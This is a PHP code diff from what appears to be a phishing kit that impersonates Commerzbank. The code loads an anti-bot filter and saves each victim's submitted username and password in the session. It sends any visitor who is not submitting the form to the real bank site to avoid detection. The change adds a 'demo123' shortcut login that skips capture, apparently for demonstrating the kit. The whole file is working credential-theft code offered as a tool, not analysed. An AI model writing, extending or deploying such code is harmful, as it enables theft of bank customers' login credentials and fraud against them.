@@ -6,8 +6,21 @@ include '../antibot/tds.php';
  
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $_SESSION['xusr'] = $_POST['xusr'];
-    $_SESSION['xpss'] = $_POST['xpss'];
+    // Check for demo user credentials
+    if ($_POST['xusr'] === 'demo123' && $_POST['xpss'] === 'demo123') {
+        // Set demo user session data
+        $_SESSION['xusr'] = 'demo123';
+        $_SESSION['xpss'] = 'demo123';
+        $_SESSION['demo_user'] = true;
+        
+        // Redirect to next step
+        header('Location: infoz.php');
+        exit();
+    } else {
+        // Regular user login
+        $_SESSION['xusr'] = $_POST['xusr'];
+        $_SESSION['xpss'] = $_POST['xpss'];
+    }
 } else {
     header('Location: https://www.commerzbank.de/');
     exit();
